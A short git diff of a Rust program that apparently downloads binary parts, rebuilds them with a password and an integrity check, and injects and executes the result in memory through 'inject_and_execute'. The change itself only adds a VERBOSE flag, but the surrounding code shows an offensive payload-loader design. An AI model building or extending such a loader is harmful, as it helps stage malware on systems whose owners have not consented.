@@ -5,6 +5,8 @@ use mounterlib::{
     reconstruct::rebuild_from_parts, 
     execution::local_pe::inject_and_execute};
 
+const VERBOSE:bool = true;
+
 fn main() {
 
     // Download urls
@@ -22,8 +24,8 @@ fn main() {
         let binary = rebuild_from_parts(
             parts,
             Some("m3str3"), // Password
-            true, // Integrity check
-            true // Verbose
+            true,           // Integrity check
+            VERBOSE         // Verbose
         ).expect("Failed to reconstruct binary");
         
     println!("[+] Reconstructed binary: {} bytes", binary.len());
